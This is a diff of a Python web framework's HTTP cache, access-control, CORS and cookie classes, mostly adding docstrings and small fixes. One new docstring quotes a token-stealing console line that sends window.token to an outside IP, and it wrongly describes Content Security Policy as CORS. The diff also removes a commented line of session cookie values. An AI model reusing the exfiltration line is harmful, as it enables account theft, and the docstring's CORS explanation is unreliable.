@@ -456,7 +456,7 @@ class HTTPClientCacheControl:
 
 	# True state will cause the (possibly) personalized response to only be stored
 	# with the specific client and not be leaked to any other user of the cache.
-	
+
 	# False would indicate that the response
 	# can be stored in a shared cache.
 	# Responses for requests with Authorization header fields
@@ -498,13 +498,16 @@ class HTTPClientCacheControl:
 	# Enable "Date" header in the response
 	date_stamp_enabled = True
 
-
+	# whether to enable caching in responses automatically or not
+	# todo: This may be garbage data sometimes, but it doesn't interfere with anything
+	# and is only used by http session, so it should be fine
+	enable_by_default:bool = False
 
 
 
 class HTTPCachedResource:
 	"""
-	Represents any kind of response resource that is supposed to be cached.
+	Represents any kind of response resource that is supposed to be cached by the client.
 	"""
 
 	def __init__(self, request_headers:HTTPHeaders, response_headers:HTTPHeaders, cl_caching:HTTPClientCacheControl):
@@ -520,9 +523,11 @@ class HTTPCachedResource:
 		self.no_store =           cl_caching.no_store
 		self.immutable =          cl_caching.immutable
 		self._max_age =           cl_caching.max_age
-		self.upd_cache_ctrl_header()
 		self.etag_enabled =       cl_caching.etag_enabled
 		self.date_stamp_enabled = cl_caching.date_stamp_enabled
+
+		# todo: is this really needed here ?
+		self.upd_cache_ctrl_header()
 
 
 	def info_from_file(self, file:str|Path|bytes, etag=None):
@@ -544,7 +549,8 @@ class HTTPCachedResource:
 
 		if (self.etag_enabled and etag != False) or etag == True:
 			with open(str(file), 'rb') as fbuf:
-				self.response_headers['etag'] = jag_util.progrssive_hash(fbuf, hashlib.md5, 50)
+				# todo: is there a better, built-in, platform independent alternative for sha1 ?
+				self.response_headers['etag'] = jag_util.progrssive_hash(fbuf, hashlib.sha1, 50, insecure=True)
 
 	def max_age(self, days=0, hours=0, minutes=0, seconds=0, weeks=0):
 		"""Set max age of a response resource"""
@@ -646,7 +652,7 @@ class AccessControl:
 	# Syntax: ['header-name', 'header-name' ...] OR '*'
 	expose_headers:list[str]|tuple[str]|set[str]|str = None
 
-	# Tell browsers whether to expose the response
+	# Tell the browser whether to expose the response
 	# to the frontend JavaScript code
 	# when the request's credentials mode(Request.credentials) is include.
 	allow_credentials:str = None
@@ -654,6 +660,10 @@ class AccessControl:
 	# whether to respond to the OPTIONS requests automatically
 	# and omit user function execution
 	options_auto_negotiation:bool = True
+
+	# Whether to apply these policies to the server
+	# Experimental
+	enforce_on_server:bool = False
 
 	def __init__(self, request_headers:HTTPHeaders, response_headers:HTTPHeaders):
 		self.request_headers = request_headers
@@ -690,14 +700,41 @@ class CORSAllowance:
 	This is only needed when a client requests, lets say index.html,
 	aka signal the browser which urls it may try connecting to
 	in the first place.
-	
-	``'self'`` IS A SEPARATE BOOLEAN
 
-	Syntax::
+	For instance, you visit discord.com
+
+	Discord is partnered with a bunch of websites, such as
+	hcaptcha.com, connect.facebook.net, gstatic.com, youtube.com and so on...
+
+	Which means, the discord's website is loading/sending stuff to the domains
+	mentioned above.
+
+	But then come 14 year old "hackers" and ask users to copypaste
+	``"fetch('http//57.121.67.3:8383/hax/' + window.token)"`` into the console
+	for free Discord Nitro.
+
+	This is where CORS comes into play: Whenever you load discord.gg -
+	a header containing a list of domains the browser is allowed to connect to
+	is sent alongside index.html
+
+	To make this class work - declare this class and overwrite
+	the following attributes:
+		* **policy**\ `=None`: The CORS policy itself.
+
+		* | **include_self**\ `=True`: Whether the browser is allowed to connect
+		  | to the domain the page was loaded from.
+		  | Aka setting this to False would mean that the wepbage is unable
+		  | to load stuff like style.css, font.ttf and so on.
+
+		* | **auto_apply_to_home_route**\ `=True`: Whether to automatically send
+		  | the CORS header when client requests @JagRoute("/")
+
+	``policy`` syntax::
 
 	    [
 	        ( '<directive>', ('url', 'url' ...) ),
 	        ( 'connect-src', ('url', 'url' ...) ),
+	        ...
 	    ]
 	"""
 
@@ -707,6 +744,7 @@ class CORSAllowance:
 	# This should always be True, unless there are some VERY specific needs
 	include_self:bool = True
 
+	auto_apply_to_home_route:bool = True
 
 	def __init__(self):
 		"""\
@@ -729,22 +767,33 @@ class CORSAllowance:
 
 
 
-
-# trac_form_token=86adf94183eef80ca7c0d594; trac_session=824a0c6ad224fe65bfedea53
-
 class Cookies:
-	""" BISCUITS """
+	"""
+	This class controls cookies in response header fields.
+
+	Only has 1 method: **add_cookie**
+	"""
 	def __init__(self, request_headers:HTTPHeaders, response_headers:HTTPHeaders):
 		init_data = request_headers['cookie']
 		self.request_cookies:HTTPHeaderKV = HTTPHeaderKV(init_data)
 		self.response_headers:HTTPHeaders = response_headers
 		# self.response_cookies = HTTPHeaderKV()
 
-
 	def add_cookie(self, cname, cval, params:dict|None=None):
-		"""\
+		"""
 		Adds one Set-Cookie header per call.
-		"expires" parameter accepts datetime objects.
+
+			* **cname**: The name of the cookie.
+			* **cval**: The value of the cookie.
+
+			* | **params**: A dictionary of standard cookie params:
+			  | - domain
+			  | - expires (accepts datetime.datetime and HTTPDateTime objects)
+			  | - secure
+			  | - path
+			  | - httponly (set to False by default)
+			  | - max_age
+			  | - samesite
 		"""
 		params = params or {}
 		cookie_params = {
@@ -757,9 +806,9 @@ class Cookies:
 			'samesite': None,
 		} | params
 
-		expires = cookie_params['Expires']
+		expires = cookie_params['expires']
 		if expires:
-			cookie_params['Expires'] = HTTPDateTime(expires)
+			cookie_params['expires'] = HTTPDateTime(expires)
 
 		self.response_headers['set-cookie'] = f'{cname}={cval}; {str(HTTPHeaderKV(cookie_params))}'
 
